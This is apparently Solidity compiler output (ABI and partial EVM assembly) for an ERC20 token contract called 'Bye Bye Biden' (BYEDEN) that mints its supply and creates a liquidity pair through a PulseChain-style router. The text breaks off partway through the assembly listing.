{
	"contracts/Classes/moo.sol": {
		"BYEDEN": {
			"abi": [
				{
					"inputs": [],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Approval",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "previousOwner",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "newOwner",
							"type": "address"
						}
					],
					"name": "OwnershipTransferred",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Transfer",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "LPpair",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "_balances",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						}
					],
					"name": "allowance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "approve",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "account",
							"type": "address"
						}
					],
					"name": "balanceOf",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "blocktx",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "decimals",
					"outputs": [
						{
							"internalType": "uint8",
							"name": "",
							"type": "uint8"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "subtractedValue",
							"type": "uint256"
						}
					],
					"name": "decreaseAllowance",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "hash",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "addedValue",
							"type": "uint256"
						}
					],
					"name": "increaseAllowance",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "name",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "renounceOwnership",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "route",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "router",
					"outputs": [
						{
							"internalType": "contract IDEXRouter",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "symbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tS",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tStamp",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "totalSupply",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "transfer",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "transferFrom",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "newOwner",
							"type": "address"
						}
					],
					"name": "transferOwnership",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Classes/moo.sol\":9084:9582  contract BYEDEN is ERC20, Ownable {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Classes/moo.sol\":2908:2968  address pulseV2 = 0x165C3410fC91EF562C50559f7d2289fEbed552d9 */\n  0x07\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n    /* \"contracts/Classes/moo.sol\":2926:2968  0x165C3410fC91EF562C50559f7d2289fEbed552d9 */\n  0x165c3410fc91ef562c50559f7d2289febed552d9\n    /* \"contracts/Classes/moo.sol\":2908:2968  address pulseV2 = 0x165C3410fC91EF562C50559f7d2289fEbed552d9 */\n  or\n  swap1\n  sstore\n    /* \"contracts/Classes/moo.sol\":4560:4584  bool public hash = false */\n  0x09\n  dup1\n  sload\n  not(shl(0xa0, 0xff))\n  and\n  swap1\n  sstore\n    /* \"contracts/Classes/moo.sol\":5324:5334  decimals() */\n  tag_1\n    /* \"contracts/Classes/moo.sol\":3392:3394  18 */\n  0x12\n  swap1\n    /* \"contracts/Classes/moo.sol\":3310:3401  function decimals() public view virtual override returns (uint8) {... */\n  jump\n    /* \"contracts/Classes/moo.sol\":5324:5334  decimals() */\ntag_1:\n    /* \"contracts/Classes/moo.sol\":5320:5334  10**decimals() */\n  tag_3\n  swap1\n    /* \"contracts/Classes/moo.sol\":5320:5322  10 */\n  0x0a\n    /* \"contracts/Classes/moo.sol\":5320:5334  10**decimals() */\n  tag_4\n  jump\t// in\ntag_3:\n    /* \"contracts/Classes/moo.sol\":5308:5335  20240000 * (10**decimals()) */\n  tag_5\n  swap1\n    /* \"contracts/Classes/moo.sol\":5308:5316  20240000 */\n  0x0134d680\n    /* \"contracts/Classes/moo.sol\":5308:5335  20240000 * (10**decimals()) */\n  tag_6\n  jump\t// in\ntag_5:\n    /* \"contracts/Classes/moo.sol\":5288:5335  uint256 public tS = 20240000 * (10**decimals()) */\n  0x0b\n  sstore\n    /* \"contracts/Classes/moo.sol\":9135:9277  constructor() ERC20(\"Bye Bye Biden\", \"BYEDEN\"){... */\n  callvalue\n  dup1\n  iszero\n  tag_7\n  jumpi\n  0x00\n  dup1\n  revert\ntag_7:\n  pop\n    /* \"contracts/Classes/moo.sol\":2979:3092  constructor(string memory name_, string memory symbol_) {... */\n  mload(0x40)\n  dup1\n  0x40\n  add\n  0x40\n  mstore\n  dup1\n  0x0d\n  dup2\n  mstore\n  0x20\n  add\n  shl(0x99, 0x213cb290213cb2902134b232b7)\n  dup2\n  mstore\n  pop\n  mload(0x40)\n  dup1\n  0x40\n  add\n  0x40\n  mstore\n  dup1\n  0x06\n  dup2\n  mstore\n  0x20\n  add\n  shl(0xd1, 0x212ca2a222a7)\n  dup2\n  mstore\n  pop\n    /* \"contracts/Classes/moo.sol\":3053:3058  name_ */\n  dup2\n    /* \"contracts/Classes/moo.sol\":3045:3050  _name */\n  0x05\n    /* \"contracts/Classes/moo.sol\":3045:3058  _name = name_ */\n  swap1\n  dup2\n  tag_12\n  swap2\n  swap1\n  tag_13\n  jump\t// in\ntag_12:\n  pop\n    /* \"contracts/Classes/moo.sol\":3068:3075  _symbol */\n  0x06\n    /* \"contracts/Classes/moo.sol\":3068:3085  _symbol = symbol_ */\n  tag_14\n    /* \"contracts/Classes/moo.sol\":3078:3085  symbol_ */\n  dup3\n    /* \"contracts/Classes/moo.sol\":3068:3075  _symbol */\n  dup3\n    /* \"contracts/Classes/moo.sol\":3068:3085  _symbol = symbol_ */\n  tag_13\n  jump\t// in\ntag_14:\n  pop\n    /* \"contracts/Classes/moo.sol\":2979:3092  constructor(string memory name_, string memory symbol_) {... */\n  pop\n  pop\n    /* \"contracts/Classes/moo.sol\":535:567  _transferOwnership(_msgSender()) */\n  tag_16\n    /* \"contracts/Classes/moo.sol\":554:566  _msgSender() */\n  tag_17\n    /* \"contracts/Classes/moo.sol\":554:564  _msgSender */\n  shl(0x20, tag_18)\n    /* \"contracts/Classes/moo.sol\":554:566  _msgSender() */\n  0x20\n  shr\n  jump\t// in\ntag_17:\n    /* \"contracts/Classes/moo.sol\":535:553  _transferOwnership */\n  tag_19\n    /* \"contracts/Classes/moo.sol\":535:567  _transferOwnership(_msgSender()) */\n  jump\t// in\ntag_16:\n    /* \"contracts/Classes/moo.sol\":9191:9205  uint256 Supply */\n  0x00\n    /* \"contracts/Classes/moo.sol\":9220:9234  10**decimals() */\n  tag_22\n    /* \"contracts/Classes/moo.sol\":3392:3394  18 */\n  0x12\n    /* \"contracts/Classes/moo.sol\":9220:9222  10 */\n  0x0a\n    /* \"contracts/Classes/moo.sol\":9220:9234  10**decimals() */\n  tag_4\n  jump\t// in\ntag_22:\n    /* \"contracts/Classes/moo.sol\":9208:9235  20240000 * (10**decimals()) */\n  tag_23\n  swap1\n    /* \"contracts/Classes/moo.sol\":9208:9216  20240000 */\n  0x0134d680\n    /* \"contracts/Classes/moo.sol\":9208:9235  20240000 * (10**decimals()) */\n  tag_6\n  jump\t// in\ntag_23:\n    /* \"contracts/Classes/moo.sol\":9191:9235  uint256 Supply = 20240000 * (10**decimals()) */\n  swap1\n  pop\n    /* \"contracts/Classes/moo.sol\":9245:9270  _mint(msg.sender, Supply) */\n  tag_24\n    /* \"contracts/Classes/moo.sol\":9251:9261  msg.sender */\n  caller\n    /* \"contracts/Classes/moo.sol\":9191:9235  uint256 Supply = 20240000 * (10**decimals()) */\n  dup3\n    /* \"contracts/Classes/moo.sol\":9245:9250  _mint */\n  tag_25\n    /* \"contracts/Classes/moo.sol\":9245:9270  _mint(msg.sender, Supply) */\n  jump\t// in\ntag_24:\n    /* \"contracts/Classes/moo.sol\":9181:9277  {... */\n  pop\n    /* \"contracts/Classes/moo.sol\":9084:9582  contract BYEDEN is ERC20, Ownable {... */\n  jump(tag_64)\n    /* \"contracts/Classes/moo.sol\":120:216  function _msgSender() internal view virtual returns (address) {... */\ntag_18:\n    /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n  caller\n  swap1\n    /* \"contracts/Classes/moo.sol\":120:216  function _msgSender() internal view virtual returns (address) {... */\n  jump\t// out\n    /* \"contracts/Classes/moo.sol\":1227:1414  function _transferOwnership(address newOwner) internal virtual {... */\ntag_19:\n    /* \"contracts/Classes/moo.sol\":1319:1325  _owner */\n  0x0c\n  dup1\n  sload\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Classes/moo.sol\":1335:1352  _owner = newOwner */\n  dup4\n  dup2\n  and\n  not(sub(shl(0xa0, 0x01), 0x01))\n  dup4\n  and\n  dup2\n  or\n  swap1\n  swap4\n  sstore\n    /* \"contracts/Classes/moo.sol\":1367:1407  OwnershipTransferred(oldOwner, newOwner) */\n  mload(0x40)\n    /* \"contracts/Classes/moo.sol\":1319:1325  _owner */\n  swap2\n  and\n  swap2\n    /* \"contracts/Classes/moo.sol\":1335:1352  _owner = newOwner */\n  swap1\n    /* \"contracts/Classes/moo.sol\":1319:1325  _owner */\n  dup3\n  swap1\n    /* \"contracts/Classes/moo.sol\":1367:1407  OwnershipTransferred(oldOwner, newOwner) */\n  0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n  swap1\n    /* \"contracts/Classes/moo.sol\":1300:1316  address oldOwner */\n  0x00\n  swap1\n    /* \"contracts/Classes/moo.sol\":1367:1407  OwnershipTransferred(oldOwner, newOwner) */\n  log3\n    /* \"contracts/Classes/moo.sol\":1290:1414  {... */\n  pop\n    /* \"contracts/Classes/moo.sol\":1227:1414  function _transferOwnership(address newOwner) internal virtual {... */\n  pop\n  jump\t// out\n    /* \"contracts/Classes/moo.sol\":6212:6933  function _mint(address account, uint256 amount) internal virtual {... */\ntag_25:\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Classes/moo.sol\":6295:6316  account != address(0) */\n  dup3\n  and\n    /* \"contracts/Classes/moo.sol\":6287:6352  require(account != address(0), \"ERC20: mint to the zero address\") */\n  tag_31\n  jumpi\n  mload(0x40)\n  shl(0xe5, 0x461bcd)\n  dup2\n  mstore\n    /* \"#utility.yul\":4585:4587   */\n  0x20\n    /* \"contracts/Classes/moo.sol\":6287:6352  require(account != address(0), \"ERC20: mint to the zero address\") */\n  0x04\n  dup3\n  add\n    /* \"#utility.yul\":4567:4588   */\n  mstore\n    /* \"#utility.yul\":4624:4626   */\n  0x1f\n    /* \"#utility.yul\":4604:4622   */\n  0x24\n  dup3\n  add\n    /* \"#utility.yul\":4597:4627   */\n  mstore\n    /* \"#utility.yul\":4663:4696   */\n  0x45524332303a206d696e7420746f20746865207a65726f206164647265737300\n    /* \"#utility.yul\":4643:4661   */\n  0x44\n  dup3\n  add\n    /* \"#utility.yul\":4636:4697   */\n  mstore\n    /* \"#utility.yul\":4714:4732   */\n  0x64\n  add\n    /* \"contracts/Classes/moo.sol\":6287:6352  require(account != address(0), \"ERC20: mint to the zero address\") */\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  revert\ntag_31:\n    /* \"contracts/Classes/moo.sol\":6439:6445  amount */\n  dup1\n    /* \"contracts/Classes/moo.sol\":6423:6435  _totalSupply */\n  0x04\n  0x00\n    /* \"contracts/Classes/moo.sol\":6423:6445  _totalSupply += amount */\n  dup3\n  dup3\n  sload\n  tag_36\n  swap2\n  swap1\n  tag_37\n  jump\t// in\ntag_36:\n  swap1\n  swap2\n  sstore\n  pop\n  pop\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Classes/moo.sol\":6591:6609  _balances[account] */\n  dup3\n  and\n  0x00\n  dup2\n  dup2\n  mstore\n    /* \"contracts/Classes/moo.sol\":6591:6600  _balances */\n  0x02\n    /* \"contracts/Classes/moo.sol\":6591:6609  _balances[account] */\n  0x20\n  swap1\n  dup2\n  mstore\n  0x40\n  dup1\n  dup4\n  keccak256\n    /* \"contracts/Classes/moo.sol\":6591:6619  _balances[account] += amount */\n  dup1\n  sload\n  dup7\n  add\n  swap1\n  sstore\n    /* \"contracts/Classes/moo.sol\":6644:6681  Transfer(address(0), account, amount) */\n  mload\n    /* \"#utility.yul\":5019:5044   */\n  dup5\n  dup2\n  mstore\n    /* \"contracts/Classes/moo.sol\":6644:6681  Transfer(address(0), account, amount) */\n  0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n  swap2\n    /* \"#utility.yul\":4992:5010   */\n  add\n    /* \"contracts/Classes/moo.sol\":6644:6681  Transfer(address(0), account, amount) */\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  log3\n    /* \"contracts/Classes/moo.sol\":6700:6715  block.timestamp */\n  timestamp\n    /* \"contracts/Classes/moo.sol\":6691:6697  tStamp */\n  0x0a\n    /* \"contracts/Classes/moo.sol\":6691:6715  tStamp = block.timestamp */\n  sstore\n    /* \"contracts/Classes/moo.sol\":6717:6722  route */\n  0x09\n    /* \"contracts/Classes/moo.sol\":6717:6732  route = account */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n  sub(shl(0xa0, 0x01), 0x01)\n  dup5\n  and\n  or\n  swap1\n  sstore\n    /* \"contracts/Classes/moo.sol\":6829:6836  pulseV2 */\n  sload(0x07)\n  0x00\n    /* \"contracts/Classes/moo.sol\":6809:6837  router = IDEXRouter(pulseV2) */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Classes/moo.sol\":6829:6836  pulseV2 */\n  swap1\n  swap3\n  and\n    /* \"contracts/Classes/moo.sol\":6809:6837  router = IDEXRouter(pulseV2) */\n  swap2\n  dup3\n  or\n  swap1\n  sstore\n    /* \"contracts/Classes/moo.sol\":6868:6884  router.factory() */\n  0x40\n  dup1\n  mload\n  shl(0xe0, 0xc45a0155)\n  dup2\n  mstore\n  swap1\n  mload\n    /* \"contracts/Classes/moo.sol\":6868:6882  router.factory */\n  0xc45a0155\n  swap2\n    /* \"contracts/Classes/moo.sol\":6868:6884  router.factory() */\n  0x04\n  dup1\n  dup3\n  add\n  swap3\n  0x20\n  swap3\n  swap1\n  swap2\n  swap1\n  dup3\n  swap1\n  sub\n  add\n  dup2\n    /* \"contracts/Classes/moo.sol\":6829:6836  pulseV2 */\n  dup7\n    /* \"contracts/Classes/moo.sol\":6868:6884  router.factory() */\n  gas\n  staticcall\n  iszero\n  dup1\n  iszero\n  tag_43\n  jumpi\n  returndatasize\n  0x00\n  dup1\n  returndatacopy\n  revert(0x00, returndatasize)\ntag_43:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  not(0x1f)\n  0x1f\n  dup3\n  add\n  and\n  dup3\n  add\n  dup1\n  0x40\n  mstore\n  pop\n  dup2\n  add\n  swap1\n  tag_44\n  swap2\n  swap1\n  tag_45\n  jump\t// in\ntag_44:\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Classes/moo.sol\":6856:6896  IDEXFactory(router.factory()).createPair */\n  and\n  0xc9c65396\n    /* \"contracts/Classes/moo.sol\":6897:6903  router */\n  0x00\n  dup1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  sub(shl(0xa0, 0x01), 0x01)\n  and\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Classes/moo.sol\":6897:6908  router.WPLS */\n  and\n  0xef8ef56f\n    /* \"contracts/Classes/moo.sol\":6897:6910  router.WPLS() */\n  mload(0x40)\n  dup2\n  0xffffffff\n  and\n  0xe0\n  shl\n  dup2\n  mstore\n  0x04\n  add\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  dup7\n  gas\n  staticcall\n  iszero\n  dup1\n  iszero\n  tag_47\n  jumpi\n  returndatasize\n  0x00\n  dup1\n  returndatacopy\n  revert(0x00, returndatasize)\ntag_47:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  not(0x1f)\n  0x1f\n  dup3\n  add\n  and\n  dup3\n  add\n  dup1\n  0x40\n  mstore\n  pop\n  dup2\n  add\n  swap1\n  tag_48\n  swap2\n  swap1\n  tag_45\n  jump\t// in\ntag_48:\n    /* \"contracts/Classes/moo.sol\":6856:6926  IDEXFactory(router.factory()).createPair(router.WPLS(), address(this)) */\n  mload(0x40)\n  not(sub(shl(0xe0, 0x01), 0x01))\n  0xe0\n  dup5\n  swap1\n  shl\n  and\n  dup2\n  mstore\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"#utility.yul\":5580:5595   */\n  swap1\n  swap2\n  and\n    /* \"contracts/Classes/moo.sol\":6856:6926  IDEXFactory(router.factory()).createPair(router.WPLS(), address(this)) */\n  0x04\n  dup3\n  add\n    /* \"#utility.yul\":5562:5596   */\n  mstore\n    /* \"contracts/Classes/moo.sol\":6920:6924  this */\n  address\n    /* \"#utility.yul\":5612:5630   */\n  0x24\n  dup3\n  add\n    /* \"#utility.yul\":5605:5648   */\n  mstore\n    /* \"#utility.yul\":5497:5515   */\n  0x44\n  add\n    /* \"contracts/Classes/moo.sol\":6856:6926  IDEXFactory(router.factory()).createPair(router.WPLS(), address(this)) */\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  0x00\n  dup8\n  gas\n  call\n  iszero\n  dup1\n  iszero\n  tag_52\n  jumpi\n  returndatasize\n  0x00\n  dup1\n  returndatacopy\n  revert(0x00, returndatasize)\ntag_52:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  not(0x1f)\n  0x1f\n  dup3\n  add\n  and\n  dup3\n  add\n  dup1\n  0x40\n  mstore\n  pop\n  dup2\n  add\n  swap1\n  tag_53\n  swap2\n  swap1\n  tag_45\n  jump\t// in\ntag_53:\n    /* \"contracts/Classes/moo.sol\":6847:6853  LPpair */\n  0x01\n    /* \"contracts/Classes/moo.sol\":6847:6926  LPpair = IDEXFactory(router.factory()).createPair(router.WPLS(), address(this)) */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n  sub(shl(0xa0, 0x01), 0x01)\n  swap3\n  swap1\n  swap3\n  and\n  swap2\n  swap1\n  swap2\n  or\n  swap1\n  sstore\n  pop\n  pop\n    /* \"contracts/Classes/moo.sol\":6212:6933  function _mint(address account, uint256 amount) internal virtual {... */\n  jump\t// out\n    /* \"contracts/Classes/moo.sol\":7480:7613  function _beforeTokenTransfer(... */\ntag_35:\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":14:141   */\ntag_56:\n    /* \"#utility.yul\":75:85   */\n  0x4e487b71\n    /* \"#utility.yul\":70:73   */\n  0xe0\n    /* \"#utility.yul\":66:86   */\n  shl\n    /* \"#utility.yul\":63:64   */\n  0x00\n    /* \"#utility.yul\":56:87   */\n  mstore\n    /* \"#utility.yul\":106:110   */\n  0x11\n    /* \"#utility.yul\":103:104   */\n  0x04\n    /* \"#utility.yul\":96:111   */\n  mstore\n    /* \"#utility.yul\":130:134   */\n  0x24\n    /* \"#utility.yul\":127:128   */\n  0x00\n    /* \"#utility.yul\":120:135   */\n  revert\n    /* \"#utility.yul\":146:562   */\ntag_57:\n    /* \"#utility.yul\":235:236   */\n  0x01\n    /* \"#utility.yul\":272:277   */\n  dup2\n    /* \"#utility.yul\":235:236   */\n  dup2\n    /* \"#utility.yul\":286:556   */\ntag_67:\n    /* \"#utility.yul\":307:314   */\n  dup1\n    /* \"#utility.yul\":297:305   */\n  dup6\n    /* \"#utility.yul\":294:315   */\n  gt\n    /* \"#utility.yul\":286:556   */\n  iszero\n  tag_69\n  jumpi\n    /* \"#utility.yul\":366:370   */\n  dup2\n    /* \"#utility.yul\":362:363   */\n  0x00\n    /* \"#utility.yul\":358:364   */\n  not\n    /* \"#utility.yul\":354:371   */\n  div\n    /* \"#utility.yul\":348:352   */\n  dup3\n    /* \"#utility.yul\":345:372   */\n  gt\n    /* \"#utility.yul\":342:395   */\n  iszero\n  tag_71\n  jumpi\n    /* \"#utility.yul\":375:393   */\n  tag_71\n  tag_56\n  jump\t// in\ntag_71:\n    /* \"#utility.yul\":425:432   */\n  dup1\n    /* \"#utility.yul\":415:423   */\n  dup6\n    /* \"#utility.yul\":411:433   */\n  and\n    /* \"#utility.yul\":408:463   */\n  iszero\n  tag_72\n  jumpi\n    /* \"#utility.yul\":445:461   */\n  swap2\n  dup2\n  mul\n  swap2\n    /* \"#utility.yul\":408:463   */\ntag_72:\n    /* \"#utility.yul\":524:546   */\n  swap4\n  dup5\n  shr\n  swap4\n    /* \"#utility.yul\":484:499   */\n  swap1\n  dup1\n  mul\n  swap1\n    /* \"#utility.yul\":286:556   */\n  jump(tag_67)\ntag_69:\n    /* \"#utility.yul\":290:293   */\n  pop\n    /* \"#utility.yul\":146:562   */\n  swap3\n  pop\n  swap3\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":567:1373   */\ntag_58:\n    /* \"#utility.yul\":616:621   */\n  0x00\n    /* \"#utility.yul\":646:654   */\n  dup3\n    /* \"#utility.yul\":636:716   */\n  tag_74\n  jumpi\n  pop\n    /* \"#utility.yul\":687:688   */\n  0x01\n    /* \"#utility.yul\":701:706   */\n  jump(tag_73)\n    /* \"#utility.yul\":636:716   */\ntag_74:\n    /* \"#utility.yul\":735:739   */\n  dup2\n    /* \"#utility.yul\":725:801   */\n  tag_75\n  jumpi\n  pop\n    /* \"#utility.yul\":772:773   */\n  0x00\n    /* \"#utility.yul\":786:791   */\n  jump(tag_73)\n    /* \"#utility.yul\":725:801   */\ntag_75:\n    /* \"#utility.yul\":817:821   */\n  dup2\n    /* \"#utility.yul\":835:836   */\n  0x01\n    /* \"#utility.yul\":830:889   */\n  dup2\n  eq\n  tag_77\n  jumpi\n    /* \"#utility.yul\":903:904   */\n  0x02\n    /* \"#utility.yul\":898:1028   */\n  dup2\n  eq\n  tag_78\n  jumpi\n    /* \"#utility.yul\":810:1028   */\n  jump(tag_76)\n    /* \"#utility.yul\":830:889   */\ntag_77:\n    /* \"#utility.yul\":860:861   */\n  0x01\n    /* \"#utility.yul\":851:861   */\n  swap2\n  pop\n    /* \"#utility.yul\":874:879   */\n  pop\n  jump(tag_73)\n    /* \"#utility.yul\":898:1028   */\ntag_78:\n    /* \"#utility.yul\":935:938   */\n  0xff\n    /* \"#utility.yul\":925:933   */\n  dup5\n    /* \"#utility.yul\":922:939   */\n  gt\n    /* \"#utility.yul\":919:962   */\n  iszero\n  tag_80\n  jumpi\n    /* \"#utility.yul\":942:960   */\n  tag_80\n  tag_56\n  jump\t// in\ntag_80:\n  pop\n  pop\n    /* \"#utility.yul\":998:999   */\n  0x01\n    /* \"#utility.yul\":984:1000   */\n  dup3\n  shl\n    /* \"#utility.yul\":1013:1018   */\n  jump(tag_73)\n    /* \"#utility.yul\":810:1028   */\ntag_76:\n  pop\n    /* \"#utility.yul\":1112:1114   */\n  0x20\n    /* \"#utility.yul\":1102:1110   */\n  dup4\n    /* \"#utility.yul\":1099:1115   */\n  lt\n    /* \"#utility.yul\":1093:1096   */\n  0x0133\n    /* \"#utility.yul\":1087:1091   */\n  dup4\n    /* \"#utility.yul\":1084:1097   */\n  lt\n    /* \"#utility.yul\":1080:1116   */\n  and\n    /* \"#utility.yul\":1074:1076   */\n  0x4e\n    /* \"#utility.yul\":1064:1072   */\n  dup5\n    /* \"#utility.yul\":1061:1077   */\n  lt\n    /* \"#utility.yul\":1056:1058   */\n  0x0b\n    /* \"#utility.yul\":1050:1054   */\n  dup5\n    /* \"#utility.yul\":1047:1059   */\n  lt\n    /* \"#utility.yul\":1043:1078   */\n  and\n    /* \"#utility.yul\":1040:1117   */\n  or\n    /* \"#utility.yul\":1037:1196   */\n  iszero\n  tag_81\n  jumpi\n  pop\n    /* \"#utility.yul\":1149:1168   */\n  dup2\n  dup2\n  exp\n    /* \"#utility.yul\":1181:1186   */\n  jump(tag_73)\n    /* \"#utility.yul\":1037:1196   */\ntag_81:\n    /* \"#utility.yul\":1228:1262   */\n  tag_82\n    /* \"#utility.yul\":1253:1261   */\n  dup4\n    /* \"#utility.yul\":1247:1251   */\n  dup4\n    /* \"#utility.yul\":1228:1262   */\n  tag_57\n  jump\t// in\ntag_82:\n    /* \"#utility.yul\":1298:1304   */\n  dup1\n    /* \"#utility.yul\":1294:1295   */\n  0x00\n    /* \"#utility.yul\":1290:1296   */\n  not\n    /* \"#utility.yul\":1286:1305   */\n  div\n    /* \"#utility.yul\":1277:1284   */\n  dup3\n    /* \"#utility.yul\":1274:1306   */\n  gt\n    /* \"#utility.yul\":1271:1329   */\n  iszero\n  tag_84\n  jumpi\n    /* \"#utility.yul\":1309:1327   */\n  tag_84\n  tag_56\n  jump\t// in\ntag_84:\n    /* \"#utility.yul\":1347:1367   */\n  mul\n  swap1\n  pop\n    /* \"#utility.yul\":567:1373   */\ntag_73:\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1378:1518   */\ntag_4:\n    /* \"#utility.yul\":1436:1441   */\n  0x00\n    /* \"#utility.yul\":1465:1512   */\n  tag_86\n    /* \"#utility.yul\":1506:1510   */\n  0xff\n    /* \"#utility.yul\":1496:1504   */\n  dup5\n    /* \"#utility.yul\":1492:1511   */\n  and\n    /* \"#utility.yul\":1486:1490   */\n  dup4\n    /* \"#utility.yul\":1465:1512   */\n  tag_58\n  jump\t// in\ntag_86:\n    /* \"#utility.yul\":1456:1512   */\n  swap4\n    /* \"#utility.yul\":1378:1518   